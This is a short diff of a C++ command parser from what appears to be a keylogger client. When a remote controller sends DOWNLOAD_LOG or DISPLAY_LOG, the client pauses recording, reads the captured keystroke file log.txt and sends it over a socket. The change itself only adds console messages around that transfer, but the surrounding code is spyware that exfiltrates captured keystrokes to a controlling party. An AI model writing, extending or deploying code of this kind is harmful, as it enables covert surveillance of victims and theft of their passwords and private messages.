@@ -36,6 +36,7 @@ void Parser::parseCommands()
 			if (command->cmd == commandType::DOWNLOAD_LOG)
 			{
 				std::ifstream file("./log.txt");
+				std::cout << "Sending log...";
 				t_cmd tosend;
 				KeyLogger::getInstance().stopRecording();
 				m_client.blockSocket();
@@ -53,11 +54,13 @@ void Parser::parseCommands()
 				tosend.data_len = 0;
 				m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
 				m_client.unblockSocket();
+				std::cout << " Done" << std::endl;
 				KeyLogger::getInstance().startRecording();
 			}
 			if (command->cmd == commandType::DISPLAY_LOG)
 			{
 				std::ifstream file("./log.txt");
+				std::cout << "Sending log...";
 				t_cmd tosend;
 				KeyLogger::getInstance().stopRecording();
 				m_client.blockSocket();
@@ -75,6 +78,7 @@ void Parser::parseCommands()
 				tosend.data_len = 0;
 				m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
 				m_client.unblockSocket();
+				std::cout << " Done" << std::endl;
 				KeyLogger::getInstance().startRecording();
 			}
 		}
